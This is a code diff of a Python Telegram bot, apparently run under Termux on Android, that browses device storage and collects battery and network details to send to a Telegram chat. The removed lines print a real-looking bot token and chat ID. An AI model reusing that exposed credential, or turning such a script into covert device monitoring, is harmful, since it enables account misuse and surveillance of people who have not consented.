@@ -4,8 +4,8 @@ import json
 import subprocess
 
 # Replace with your bot token and chat ID
-TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
-CHAT_ID = '6285177516'
+TOKEN = 'YOUR_BOT_TOKEN'
+CHAT_ID = 'YOUR_CHAT_ID'
 
 # Global variable to store current folder path
 current_folder = "/storage/emulated/0/"
@@ -66,9 +66,12 @@ def get_device_info():
         battery_status = subprocess.check_output(['termux-battery-status']).decode().strip()
         device_info['Battery'] = battery_status
 
-        # Get IP Address
-        ip_address = subprocess.check_output(['ip', 'addr', 'show', 'wlan0']).decode().strip()
-        device_info['IP Address'] = ip_address
+        # Get IP Address using termux command
+        try:
+            ip_address = subprocess.check_output(['termux-wifi-info']).decode().strip()
+            device_info['IP Address'] = ip_address
+        except Exception:
+            device_info['IP Address'] = "Unable to retrieve IP address."
 
         # Format the device info for Telegram
         info_message = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
